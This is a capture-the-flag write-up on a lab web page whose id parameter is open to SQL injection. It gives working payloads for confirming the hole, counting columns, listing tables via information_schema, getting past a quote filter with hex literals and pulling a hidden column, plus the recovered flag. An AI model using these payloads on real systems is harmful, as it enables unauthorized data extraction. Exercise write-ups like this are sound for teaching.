# SQL Injection Avancée — Writeup

**Page:** `index.php?page=searchimg` (form "Search image by ID", method `GET`, parameter `id`)
**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Mechanism

The `id` parameter is inserted directly into a SQL query with no escaping and no parameterization:

```sql
SELECT title, url FROM list_images WHERE id = <user input>
```

Since the value goes into the query text as-is, we can change the query logic:

- `id=1` → `WHERE id = 1` (returns 1 row)
- `id=1 or 1=1` → `WHERE id = 1 or 1=1` (always true, returns all rows)

What makes it "avancée": unlike `member`, here the single quote (`'`) is filtered/escaped on the backend, so quoted string literals like `WHERE table_name='users'` do not work. The workaround is HEX string literals — MySQL/MariaDB accepts `0x...` in place of `'...'`, which contains no quote character at all:

```sql
WHERE table_name = 'users'          -- blocked
WHERE table_name = 0x7573657273     -- works (0x7573657273 = 'users')
```

## Reproduction

**1. Confirm the injection:** `id=1 or 1=1` returns all 5 rows instead of 1.

**2. Count columns:** `ORDER BY 3` breaks, so the SELECT has 2 columns.

**3. List tables** (first column shows in the `Url:` field, second in `Title:`):

```sql
UNION SELECT table_name, table_schema FROM information_schema.tables
```

Found: table `list_images` in schema `Member_images`.

**4. List columns** (quotes replaced with HEX):

```sql
UNION SELECT column_name, data_type FROM information_schema.columns
WHERE table_name = 0x6C6973745F696D61676573   -- HEX('list_images')
```

Columns: `id, url, title, comment` — `comment` is never shown in the normal interface.

**5. Extract the hidden column:**

```sql
UNION SELECT comment, title FROM list_images
```

The comment on the "Hack me?" image contains an MD5 pointer `1928e8083cf461a51303633093573c46` with the instruction "decode, lowercase, then sha256".

**6. Build the flag:**

```
MD5 1928e8083cf461a51303633093573c46 -> "albatroz"
SHA256("albatroz") = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Flag comparison

Flag obtained through exploitation:

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

Compared with the `flag` file in the `SQL_injection_avancee/` submission folder during the defense.
